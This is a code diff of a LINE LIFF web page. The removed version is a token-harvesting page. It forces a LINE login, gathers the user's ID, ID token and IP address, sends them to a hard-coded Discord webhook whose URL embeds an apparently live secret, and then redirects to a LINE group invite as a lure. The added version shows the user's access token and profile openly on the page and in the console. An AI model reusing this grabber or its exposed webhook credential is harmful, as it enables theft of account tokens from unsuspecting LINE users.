@@ -1,72 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>LIFF Data to Discord</title>
-  <script src="https://static.line-scdn.net/liff/edge/2/sdk.js"></script>
+<title>LIFF Token</title>
+<script charset="utf-8" src="https://static.line-scdn.net/liff/sdk/v2/liff.js"></script>
 </head>
 <body>
-<script>
-  // 設定項目
-  const LIFF_ID = '2007556850-NzoOlegE'; // ご自身のLIFF IDに置き換えてください
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1373359224158945290/9zVF_Ljvzcgoc7NWCwUScC6_DH1oiEDSfFxRAbjYJ0l4CJqy2KmUyJJY06VcSOq9T1'; // Discord Webhook URL
-  const REDIRECT_URL = 'https://line.me/ti/g2/NHsgY4pwGsvy39ZKz6Z5IHpRvPGKW269BKjgcg?utm_source=invitation&utm_medium=link_copy&utm_campaign=default'; // 送信後のリダイレクト先
+    <h1>LIFF Token</h1>
+    <p id="accessToken"></p>
+    <p id="profile"></p>
 
-  async function main() {
-    await liff.init({ liffId: LIFF_ID });
+    <script>
+        async function initializeLiff() {
+            try {
+                await liff.init({
+                    liffId: '2007556850-NzoOlegE'
+                });
+                console.log('LIFF init success');
 
-    // ユーザーがLIFFにログインしているか確認
-    if (!liff.isLoggedIn()) {
-      // ログインしていなければログインを促す
-      // idTokenとプロフィール情報を取得するために、openidとprofileスコープを要求
-      liff.login({ scope: 'profile openid', redirectUri: window.location.href });
-      return; // ログイン処理後にページがリロードされるので、ここで処理を終了
-    }
+                if (!liff.isLoggedIn()) {
+                    liff.login(); // ログインしていない場合はログインを促す
+                    return;
+                }
 
-    // ユーザーID取得
-    let uid = null;
-    try {
-      const profile = await liff.getProfile();
-      uid = profile.userId;
-    } catch (e) {
-      console.error("Failed to get profile:", e);
-      uid = '取得失敗';
-    }
+                const accessToken = liff.getAccessToken();
+                document.getElementById('accessToken').textContent = 'Access Token: ' + accessToken;
+                console.log('Access Token:', accessToken);
 
-    // idToken取得
-    let idToken = liff.getIDToken(); // isLoggedIn()がtrueなら取得できるはず
-    if (!idToken) {
-        idToken = '取得失敗';
-    }
+                // アクセストークンを使ってユーザープロフィールを取得
+                const profile = await liff.getProfile();
+                document.getElementById('profile').textContent = 
+                    `User Profile: ${profile.displayName} (User ID: ${profile.userId})`;
+                console.log('Profile:', profile);
 
-    // IPアドレス取得
-    let ip = '不明';
-    try {
-      const res = await fetch('https://api.ipify.org?format=json');
-      const data = await res.json();
-      ip = data.ip || '取得失敗';
-    } catch (e) {
-      console.error("Failed to get IP address:", e);
-    }
+                // ★ここから先は、取得したアクセストークンやプロフィール情報を使った処理を記述できます。
+                // 例: サーバーにデータを送信するなど
+                // fetch('https://your-backend.com/api/send-data', {
+                //     method: 'POST',
+                //     headers: {
+                //         'Content-Type': 'application/json',
+                //         'Authorization': 'Bearer ' + accessToken
+                //     },
+                //     body: JSON.stringify({ userId: profile.userId, displayName: profile.displayName })
+                // });
 
-    // Discordに送信
-    const body = {
-      content: `LIFF情報を取得しました\nIP: ${ip}\nUID: ${uid}\nIDToken: ${idToken}`
-    };
-    try {
-      await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-    } catch (e) {
-      console.error("Failed to send to Discord:", e);
-    }
+            } catch (err) {
+                console.error('LIFF init failed', err);
+            }
+        }
 
-    // リダイレクト
-    window.location.href = REDIRECT_URL;
-  }
-
-  main();
-</script>
+        initializeLiff();
+    </script>
 </body>
 </html>
